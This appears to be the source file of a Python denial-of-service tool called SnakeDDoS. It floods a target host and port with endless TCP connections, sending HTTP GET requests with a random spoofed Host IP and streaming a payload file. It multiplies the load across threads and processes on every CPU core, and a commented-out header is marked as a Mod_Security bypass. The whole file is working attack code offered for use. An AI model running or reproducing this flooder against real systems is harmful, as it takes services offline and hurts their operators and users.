import socket
import threading
from random import randint
from multiprocessing import Process, cpu_count
from snakeddos.errors import NoTargetError


# FIXME: [302] Broken pip [temporary solution]
from signal import signal, SIGPIPE, SIG_DFL
signal(SIGPIPE, SIG_DFL)


class SnakeDDoS:
    def __init__(self, *, target: str = 'localhost', port: int = 80, file_name: str = '../payload/fsociety.fs'):
        self._processes = []

        # FIXME: Vars should be imported from a consts file
        self.target = target
        self.port = port

        # FIXME: headers for Mod_Security bypass
        # headers = {
        #      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',
        # }

        # FIXME: Will data=payload (requests) be necessary?
        # self.payload = {'fsociety': 'ur done'}

        self._attack_num = 0
        self.file_name = file_name

    @staticmethod
    def gen_ip():
        ip = '.'.join([str(randint(20, 182)) for x in range(4)])
        return ip

    def attack(self):
        if self.target:
            fake_ip = SnakeDDoS.gen_ip()
            try:
                while True:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((self.target, self.port))
                    s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
                    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))

                    if self.file_name:
                        s.send(self.file_name.encode())
                        print(f'File name sent: {self.file_name}')

                        with open(self.file_name, 'rb') as f:
                            while True:
                                data = f.read(1024)

                                if not data:
                                    break

                                s.send(data)

                    self._attack_num += 1
                    print(self._attack_num)
                    s.close()
            except ConnectionRefusedError:
                raise
            # FIXME: Analyze the possible exceptions and properly handle them
            except Exception as e:
                print(e)
                raise
        else:
            raise NoTargetError('No target was set')

    def start_attack(self):
        while True:
            self.attack()

    def procedure(self):
        num_cores = cpu_count()

        for i in range(num_cores):
            thread = threading.Thread(target=self.start_attack)
            thread.start()

        for i in range(num_cores):
            process = Process(target=self.start_attack)
            process.start()
            self._processes.append(process)

        for process in self._processes:
            process.join()
